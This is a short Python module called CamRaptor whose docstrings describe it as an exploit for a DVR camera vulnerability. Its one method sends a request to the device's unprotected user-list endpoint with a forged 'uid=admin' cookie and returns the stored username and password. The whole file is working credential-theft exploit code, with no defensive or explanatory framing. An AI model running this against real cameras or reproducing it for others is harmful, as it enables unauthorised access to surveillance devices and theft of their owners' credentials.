

import json
import requests


class CamRaptor(object):
    """ Main class of camraptor module.

    This main class of camraptor module is intended for providing
    an exploit for DVR camera vulnerability that extracts credentials
    through the unprotected endpoint.
    """

    def __init__(self) -> None:
        super().__init__()

    @staticmethod
    def exploit(address: str) -> tuple:
        """ Exploit the vulnerability in DVR camera and extract credentials.

        :param str address: device address
        :return tuple: tuple of username and password
        """

        try:
            cookies = {
                "uid": "admin"
            }

            response = requests.get(
                f"http://{address}/device.rsp?opt=user&cmd=list",
                cookies=cookies,
                verify=False,
                timeout=3
            )
        except Exception:
            return

        if response.status_code == 200:
            try:
                json_data = json.loads(response.text)
            except Exception:
                return

            if 'list' in json_data:
                for data in json_data["list"]:
                    username = data["uid"]
                    password = data["pwd"]

                    return username, password
